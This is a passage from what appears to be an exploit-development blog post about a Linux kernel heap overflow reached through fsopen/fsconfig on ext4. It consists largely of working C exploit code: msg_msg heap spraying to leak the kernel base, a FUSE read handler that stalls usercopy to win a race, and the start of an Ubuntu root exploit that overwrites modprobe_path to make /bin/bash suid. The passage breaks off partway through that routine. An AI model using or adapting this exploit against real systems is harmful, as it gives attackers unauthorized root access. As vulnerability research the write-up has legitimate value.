    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> targets[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x10</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    msg *message = (msg *)buffer;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> size = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1018</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// spray msg_msg</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">8</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i++) 
    {
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x41</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">+i, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer));
        targets[i] = make_queue(IPC_PRIVATE, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0666</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> | IPC_CREAT);
        send_msg(targets[i], message, size - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(pat, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x42</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(pat));
    pat[</span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(pat)</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">'\x00'</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Opening ext4 filesystem"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    fd = fsopen(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"ext4"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (fd &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) 
    {
            </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"fsopen: Remember to unshare"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
            </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">exit</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">strcpy</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(pat, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">117</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i++) 
    {
        fsconfig(fd, FSCONFIG_SET_STRING, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"\x00"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, pat, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }
    
    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// overflow, hopefully causes an OOB read on a potential msg_msg object below</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Overflowing..."</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    pat[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">21</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">'\x00'</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> evil[] = </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"\x60\x10"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    fsconfig(fd, FSCONFIG_SET_STRING, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"\x00"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, pat, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// spray more msg_msg</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">8</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x10</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i++) 
    {
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x41</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">+i, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer));
        targets[i] = make_queue(IPC_PRIVATE, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0666</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> | IPC_CREAT);
        send_msg(targets[i], message, size - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }

    fsconfig(fd, FSCONFIG_SET_STRING, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"\x00"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, evil, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Done heap overflow"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Spraying kmalloc-32"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">100</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i++) 
    {
        open(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"/proc/self/stat"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, O_RDONLY);
    }

    size = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1060</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Attempting to recieve corrupted size and leak data"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// go through all targets qids and check if we hopefully get a leak</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> j = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; j &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x10</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; j++) 
    {
        get_msg(targets[j], recieved, size, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        kbase = do_check_leak(recieved);
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (kbase) 
        {
            close(fd);
            </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> kbase;
        }
    }

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[X] No leaks, trying again"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
}</span></p></div><p>Now, we can perform the same arbitrary write technique D3v17 and I 
created. When you trigger the allocation of <code>msg_msg</code> and make a requested
 size require larger than 4096, we need to hang the usercopy when it 
copies to the first <code>msg_msg</code> chunk but before it traverses and usercopies
 to the <code>msg_msgseg</code> chunk. Previously, we did it with userfaultfd, but since 
unprivileged userfaultfd is disabled by default since 5.11, how can we 
reliably race this?</p><p>
</p><p>I went through this <a href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019%20-%20Exploiting%20race%20conditions%20on%20Linux.pdf">slideshow</a> and the <a href="https://github.com/nrb547/kernel-exploitation/blob/main/cve-2021-32606/cve-2021-32606.md">FUSE technique</a>
 caught my attention. The gist of it is that in Linux, users can 
communicate with /dev/fuse to create their own custom filesystem in 
userspace. You can create your own files in this userspace filesystem, 
map them in memory with mmap, have usercopy reach them when copying, and
 have your custom filesystem read handlers just hang or do anything else
 you want. Here is our custom FUSE filesystem&#8217;s handlers:</p><div style="background-color: whitesmoke; display: block; max-width: 100%; overflow-x: auto;"><p><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">evil_read</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">(<span class="hljs-type" style="color: #a31515;">const</span> <span class="hljs-type" style="color: #a31515;">char</span> *path, <span class="hljs-type" style="color: #a31515;">char</span> *buf, <span class="hljs-type" style="color: #a31515;">size_t</span> size, <span class="hljs-type" style="color: #a31515;">off_t</span> offset,
              <span class="hljs-keyword" style="color: blue;">struct</span> fuse_file_info *fi)</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
{
    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// change to modprobe_path</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> signal;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> evil_buffer[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">];
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(evil_buffer, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x43</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(evil_buffer));
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *evil = modprobe_win;
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memcpy</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">((</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *)(evil_buffer + </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1000</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">), evil, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(evil));

    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">size_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> len = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (offset &gt;= len)
        </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> size;

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (offset + size &gt; len)
        size = len - offset;

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memcpy</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buf, evil_buffer + offset, size);

    </span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// sync with the arb write thread</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
    read(fuse_pipes[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">], &amp;signal, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">return</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> size;
}</span></p></div><p>There were two difficulties however with this FUSE race technique. 
Normally, as a normal unprivileged user, you need access to a suid 
/bin/fusermount binary. Performing the unshare which triggered our own 
user namespace&#8217;s creation would allow us to skip that requirement. 
Another issue is that a user would require libfuse libraries for libfuse
 functions to work, as libfuse is notoriously difficult to statically 
link, as seen <a href="https://github.com/libfuse/libfuse/issues/383">here</a> because it specifically relies on <code>dl_open</code> for some extra features. We addressed this by removing all the references to <code>dl_open</code>
 and rebuilding the library. Static compilation then worked nicely and 
this technique would work on any system with <code>CONFIG_FUSE</code> enabled 
regardless of libfuse or fusermount availability.</p><p>
</p><p>One last thing with this exploit&#8230; where do we target? For the exploit
 simplicity&#8217;s sake, we only targeted <code>modprobe_path</code> (the classic 
<code>modprobe_path</code> kernel pwning trick) for our Ubuntu LPE exploits. We 
overwrote it with the path to a script that made /bin/bash suid, and 
this script will trigger with root privileges whenever anyone attempts 
to run a binary with an invalid header. Here is our Ubuntu LPE exploit 
so far:</p><div style="background-color: whitesmoke; display: block; max-width: 100%; overflow-x: auto;"><p><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// msg_msg arb write trick by hanging before <code>msg_msgseg</code> on usercopy</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-comment" style="color: green; font-family: monospace; white-space: pre;">// use FUSE to time the race</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">
</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> </span><span class="hljs-title function_" style="color: #a31515; font-family: monospace; white-space: pre;">do_win</span><span class="hljs-params" style="font-family: monospace; white-space: pre;">()</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> 
{
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> size = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> buffer[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x2000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">char</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> pat[</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">] = {</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">};
    msg* message = (msg*)buffer;
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">memset</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x44</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">sizeof</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(buffer));

    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *evil_page = mmap((</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">void</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> *)</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1337000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">uint64_t</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> race_page = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1338000</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    msg *rooter = (msg *)(race_page</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-0x8</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    rooter-&gt;mtype = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;
    size = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x1010</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">;

    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> target = make_queue(IPC_PRIVATE, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0666</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> | IPC_CREAT);
    send_msg(target, message, size - </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0x30</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);

    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Opening ext4 filesystem"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    fd = fsopen(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"ext4"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (fd &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">) 
    {
            </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"Opening"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
            </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">exit</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Overflowing..."</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">strcpy</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(pat, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">for</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (</span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> i = </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">117</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">; i++) 
    {
        fsconfig(fd, FSCONFIG_SET_STRING, </span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"\x00"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, pat, </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }
    
    </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">puts</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"[*] Prepaing fault handlers via FUSE"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    </span><span class="hljs-type" style="color: #a31515; font-family: monospace; white-space: pre;">int</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> evil_fd = open(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"evil/evil"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">, O_RDWR);
    </span><span class="hljs-keyword" style="color: blue; font-family: monospace; white-space: pre;">if</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;"> (evil_fd &lt; </span><span class="hljs-number" style="font-family: monospace; white-space: pre;">0</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">)
    {
        perror(</span><span class="hljs-string" style="color: #a31515; font-family: monospace; white-space: pre;">"evil fd failed"</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
        </span><span class="hljs-built_in" style="color: blue; font-family: monospace; white-space: pre;">exit</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">(</span><span class="hljs-number" style="font-family: monospace; white-space: pre;">-1</span><span style="background-color: whitesmoke; font-family: monospace; white-space: pre;">);
    }
